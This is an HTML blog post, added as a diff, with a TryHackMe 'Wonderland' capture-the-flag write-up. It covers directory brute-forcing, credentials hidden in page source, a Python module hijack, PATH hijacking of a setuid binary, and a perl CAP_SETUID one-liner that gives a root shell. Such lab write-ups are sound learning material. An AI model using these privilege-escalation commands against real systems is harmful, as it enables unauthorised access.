@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <link rel="shortcut icon" href="http://localhost:8000//favicon.ico">
+
+  <title>Wonderland Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Wonderland Writeup | Rooted</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Wonderland Writeup" />
+<meta name="author" content="alex" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="TryHackMe - Wonderland" />
+<meta property="og:description" content="TryHackMe - Wonderland" />
+<link rel="canonical" href="http://localhost:8000/Wonderland" />
+<meta property="og:url" content="http://localhost:8000/Wonderland" />
+<meta property="og:site_name" content="Rooted" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-16T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Wonderland Writeup" />
+<script type="application/ld+json">
+{"url":"http://localhost:8000/Wonderland","headline":"Wonderland Writeup","dateModified":"2020-07-16T00:00:00-05:00","datePublished":"2020-07-16T00:00:00-05:00","author":{"@type":"Person","name":"alex"},"@type":"BlogPosting","description":"TryHackMe - Wonderland","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Wonderland"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>alex@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Wonderland Writeup</h2>
+  <time datetime="2020-07-16T00:00:00-05:00" class="by-line">16 Jul 2020</time>
+  <h1 id="tryhackme---wonderland">TryHackMe - Wonderland</h1>
+<hr />
+
+<p>This is a medium difficulty box that’s part of the <a href="https://tryhackme.com/path/outline/OSCP">Offensive Security Path</a> on TryHackMe. For those of you who don’t know, TryHackMe is a great website that not only has great CTFs, but tutorials on different offensive security techniques. To start out this box I’ve already made a <code class="language-plaintext highlighter-rouge">wonderland</code> directory to hold all my files relevent to the box. Within that directory I like to make another <code class="language-plaintext highlighter-rouge">nmap</code> directory to hold all my scans (usually one initial one is good enough for these kinds of CTFs, but other times a more in-depth one is needed).
+<br />
+<br />
+<br /></p>
+
+<h2 id="nmap-scan">nmap Scan</h2>
+
+<p>The IP address of the box is <code class="language-plaintext highlighter-rouge">10.10.36.173</code>. We’ll start things off with a typical nmap scan:</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -sC -sV -oN nmap/wonderland_nmap_initial.txt 10.10.36.173</code>
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_nmap.png" alt="" /><br />
+<br />
+<br /></p>
+
+<p>We have two ports open, http on port 80 and ssh on port 22. Considering we don’t have any login info for ssh, let’s take a look at port 80.
+<br />
+<br /></p>
+
+<h2 id="website-enumeration">Website Enumeration</h2>
+
+<h3 id="basic-discovery">Basic Discovery</h3>
+
+<p>Here’s the home page of the website, it doesn’t look like a whole lot is going on.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_port80.png" alt="" />
+<br />
+<br /></p>
+
+<p>Let’s take a look at the source code.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;title&gt;Follow the white rabbit.&lt;/title&gt;
+    &lt;link rel="stylesheet" type="text/css" href="/main.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Follow the White Rabbit.&lt;/h1&gt;
+    &lt;p&gt;"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)&lt;/p&gt;
+    &lt;img src="/img/white_rabbit_1.jpg" style="height: 50rem;"&gt;
+&lt;/body&gt;
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>The title of the page <strong><em>Follow the white rabbit.</em></strong> sounds interesting to me. But let’s get some more info by running gobuster.</p>
+
+<h3 id="gobuster">Gobuster</h3>
+
+<p>Gobuster is a directory brute forcing tool (among other things). Basically it goes out and tries to find other directories that we can (or can’t access). I like gobuster because it’s fast, can search both directories and different file extenstions, and is used on the command line. Here’s the gobuster command I’m running:</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://10.10.36.173/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o wonderland_gobuster_root.txt
+</code></p>
+
+<p>The -o argument allows me to save the output of the gobuster run in a txt file I can reference later.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_gobuster_root.png" alt="" />
+<br />
+<br /></p>
+
+<p>The first thing that jumps out at me here is the <code class="language-plaintext highlighter-rouge">r</code> directory. Based on the fact that gobuster found an <code class="language-plaintext highlighter-rouge">r</code> directory as well as the <strong><em>Follow the white rabbit</em></strong> hint, I’m thinking we should go there. All the other stuff down there looks messy. If I need to, I can go back to it. Just for fun, I’m going to check out the <code class="language-plaintext highlighter-rouge">poem</code> directory.
+<br />
+<br /></p>
+
+<p style="text-align: center;"><img src="/assets/images/wonderland/wonderland_jabberwocky.png" alt="" /></p>
+<p><br />
+<br /></p>
+
+<p>Great poem, but not super useful to us. There wasn’t much looking at the source code either.
+<br />
+<br /></p>
+
+<h3 id="directory-traversal">Directory Traversal</h3>
+
+<p>Ok, now let’s follow the white rabbit. Going to the <code class="language-plaintext highlighter-rouge">r</code> directory leads us to this screen:
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_r.png" alt="" />
+<br />
+<br /></p>
+
+<p>Yeah, we’re on the right track. I’m going to take a shot in the dark here that the directories will spell out <code class="language-plaintext highlighter-rouge">r/a/b/b/i/t</code>. We could take the time to run <code class="language-plaintext highlighter-rouge">gobuster</code> and confirm it, but why do that when it’s easier to just guess.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_rabbit.png" alt="" />
+<br />
+<br /></p>
+
+<p>Time to take a look at the source code again.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;Enter wonderland&lt;/title&gt;
+    &lt;link rel="stylesheet" type="text/css" href="/main.css"&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1&gt;Open the door and enter wonderland&lt;/h1&gt;
+    &lt;p&gt;"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."&lt;/p&gt;
+    &lt;p&gt;Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
+    &lt;/p&gt;
+    &lt;p&gt;"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
+        the other paw, "lives a March Hare. Visit either you like: they’re both mad."&lt;/p&gt;
+    &lt;p style="display: none;"&gt;alice:PASSWORD&lt;/p&gt;
+    &lt;img src="/img/alice_door.png" style="height: 50rem;"&gt;
+&lt;/body&gt;
+
+</code></pre></div></div>
+<p><br /></p>
+
+<p>Looks like we’ve got some text that isn’t displayed to the webpage, but is present in the source as the &lt;p&gt; tag with a hidden style attribute. Those look like credentials. Let’s go back and try to login via SSH with these credentials.
+<br />
+<br /></p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>Trying out the credentials found on the website give us initial access into the system.
+<br />
+<br />
+<img src="/assets/images/wonderland/wonderland_initial_access.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="user-flag">User Flag</h2>
+
+<p>Hmm, this is interesting…most of the time this is where the user.txt is.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_alice.png" alt="" />
+<br />
+<br /></p>
+
+<p>After taking a look at the hints on THM, it says “Everything is upside down here.”. So if the root.txt is here, does that mean that the user.txt is in the root directory? Let’s take a look:
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_user.png" alt="" />
+<br />
+<br /></p>
+
+<p>Yes! That’s the user flag down. now to do some system enumeration.
+<br />
+<br /></p>
+
+<h2 id="user-enumeration">User Enumeration</h2>
+
+<p>So far, this machine has been really straightforward. There was some directory traversal, some inspecting source code that contained some creds, then taking those creds and trying them in ssh. It’s a safe bet that this will be a tad bit difficult. Looking around in the file system we see three other users <code class="language-plaintext highlighter-rouge">hatter</code>, <code class="language-plaintext highlighter-rouge">rabbit</code>, and <code class="language-plaintext highlighter-rouge">tryhackme</code>. We’ll probably have at least one or two priv escs before root. I’m also seeing a python file in our home directory called <code class="language-plaintext highlighter-rouge">walrus_and_the_carpenter.py</code>. After running the command <code class="language-plaintext highlighter-rouge">sudo -l</code> and typing in Alice’s password, we find out that we can run that program as the <code class="language-plaintext highlighter-rouge">rabbit</code> user. If we take a quick look at the program with <code class="language-plaintext highlighter-rouge">cat walrus_and_the_carpenter.py</code> we can see that there is a module imported, the random module. The program appears to take 10 random lines of a poem and print them to the screen.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_sudo-l.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Believe it or not, we have all the information we need to shift to the <code class="language-plaintext highlighter-rouge">rabbit</code> user. We can do some python path manipulation in order to do it. I saw the same type of priv esc on box over at <a href="https://www.hackthebox.eu/">Hack The Box</a>. so I had a good idea of what to do here. We can create our own random.py module in a working directory, which the python script will import before the real one (located in the <code class="language-plaintext highlighter-rouge">/usr/lib/python3.6/random.py</code>). Here’s the code we need to save as <code class="language-plaintext highlighter-rouge">random.py</code> to call on a bash shell as the rabbit user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+
+os.system('/bin/bash')
+</code></pre></div></div>
+
+<p>Then we need to change the permissions of the program with <code class="language-plaintext highlighter-rouge">chmod +x random.py</code>. Then we can run <code class="language-plaintext highlighter-rouge">walrus_and_the_carpenter.py</code> as rabbit with <code class="language-plaintext highlighter-rouge">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</code>.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_user_rabbit.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="more-user-enumeration">More User Enumeration</h2>
+<p>Taking a quick look around, there’s an executable binary called <code class="language-plaintext highlighter-rouge">teaParty</code>. Unfortunately we cannot see what sudo priveleges we have since we don’t know the rabbit’s password.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_rabbit_enum.png" alt="" />
+<br />
+<br /></p>
+
+<p>I think its a safe bet to say that there’s something to the <code class="language-plaintext highlighter-rouge">teaParty</code> file. In order to get a better idea of what it does, let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Thu, 16 Jul 2020 22:41:34 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+</code></pre></div></div>
+
+<p>It appears that there might be a <code class="language-plaintext highlighter-rouge">date</code> function being called. In order to get a better look, I’m going to use a program called <code class="language-plaintext highlighter-rouge">pspy</code> which you can read about and download <a href="https://github.com/DominicBreuker/pspy">here</a>. <code class="language-plaintext highlighter-rouge">Pspy</code> is a way to monitor linux processes, and give us a better idea of what functions the executable is calling on, and with what id#. I think the easiest way to use <code class="language-plaintext highlighter-rouge">pspy</code> in this situation is to just run two ssh sessions and monitor one with <code class="language-plaintext highlighter-rouge">pspy</code>while we run <code class="language-plaintext highlighter-rouge">teaParty</code> on the other. The first step is to spin up a web server on your attacking machine in the directory that holds <code class="language-plaintext highlighter-rouge">pspy</code> with <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>. Once that’s done, you can download it onto the victim machine with <code class="language-plaintext highlighter-rouge">wget http://&lt;your-ip-address-here&gt;:&lt;port #&gt;/pspy64</code>. Here are the results from <code class="language-plaintext highlighter-rouge">pspy</code>:
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_rabbit_esc.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="more-privilege-escalation">More Privilege Escalation</h2>
+
+<p>The interesting thing about these results is that the path for the command <code class="language-plaintext highlighter-rouge">date</code> has been left ambiguous. Because of this, we can do simple <code class="language-plaintext highlighter-rouge">PATH</code> manipulation and become the user with the id <code class="language-plaintext highlighter-rouge">1003</code>, which is the <code class="language-plaintext highlighter-rouge">hatter</code> according <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. Typing in <code class="language-plaintext highlighter-rouge">$PATH</code> will give us the path that the system will look for different commands. We can add onto the beginning of the <code class="language-plaintext highlighter-rouge">PATH</code> variable our home directory in order to ensure that the <code class="language-plaintext highlighter-rouge">date</code> command that gets run give us a shell as the <code class="language-plaintext highlighter-rouge">hatter</code>. We do this by running <code class="language-plaintext highlighter-rouge">export PATH=/home/rabbit:$PATH</code>. Once the variable has been set we can run the following:
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_hatter.png" alt="" />
+<br />
+<br />
+Now we have a shell as the <code class="language-plaintext highlighter-rouge">hatter</code> :).</p>
+
+<h2 id="even-more-user-enumeration">Even More User Enumeration…</h2>
+
+<p>The hatter has a file in his home directory called <code class="language-plaintext highlighter-rouge">password.txt</code>. After trying this password to switch to the <code class="language-plaintext highlighter-rouge">root</code> user and failing, it turns out it’s the hatter’s password. Ok, well at least now we can run <code class="language-plaintext highlighter-rouge">sudo -l</code> and get an idea of how we can get root!
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_hatter_priv.png" alt="" />
+<br />
+<br /></p>
+
+<p>oh…
+<br />
+<br /></p>
+
+<p>After floundering about for a bit, I decided to upload <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, which is a shell script that will enumerate a system in a bright color scheme so you can scan through the results quick. You can read more about it and download <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">here</a>. Just like before we need to first spin up a web server with <code class="language-plaintext highlighter-rouge">python3 -m http.server</code> in the directory with the script in it. Then we get on the wonderland box and grab the file with <code class="language-plaintext highlighter-rouge">wget http://&lt;your-ip-address-here&gt;:&lt;port #&gt;/linpeas.sh</code>.
+Once the file is on wonderland, change the permission with <code class="language-plaintext highlighter-rouge">chmod +x linpeas.sh</code>, then run the script with <code class="language-plaintext highlighter-rouge">./linpeas.sh</code>.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_linpeas.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="even-more-privilege-escalation">Even More Privilege Escalation</h2>
+<p>Parsing through the linpeas looking for any interesting red text, we find:
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_hatter_priv_esc.png" alt="" />
+<br />
+<br /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">linpeas</code> script showed us that perl has the <code class="language-plaintext highlighter-rouge">CAP_SETUID</code> capability. Using <a href="https://gtfobins.github.io">GTFOBins</a> to search for perl we get a great result under capabilities.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_gtfo.png" alt="" />
+<br />
+<br /></p>
+
+<p>We should be able to simply run the command <code class="language-plaintext highlighter-rouge">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code> and get root.
+<br />
+<br /></p>
+
+<p><img src="/assets/images/wonderland/wonderland_root.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>That’s it! We got root on this box. This was the perfect level of difficulty for me at this time so I had a lot of fun on this one. I got to the box pretty quick, but the priv esc took some time. If it wasn’t for my earlier exposure to python path manipulation I would’ve struggled with that. There were also plenty of places where you could’ve gone down a rabbit hole (pun intended). There were some crazy web directories, and I wouldn’t have blamed someone if they thought there was some stego in one of the pictures on the website. All in all a great room. I loved the theme, the priv esc, and the fact that the user and root flags were switched was a nice touch. Thanks if you’ve read this far, I hope it helped you out some!
+<br />
+<br /></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>alex</b>
+    </span>
+    
+    <span>© 2021</span>
+  </a>
+</footer>
+
+
+  
+</body>
+
+</html>
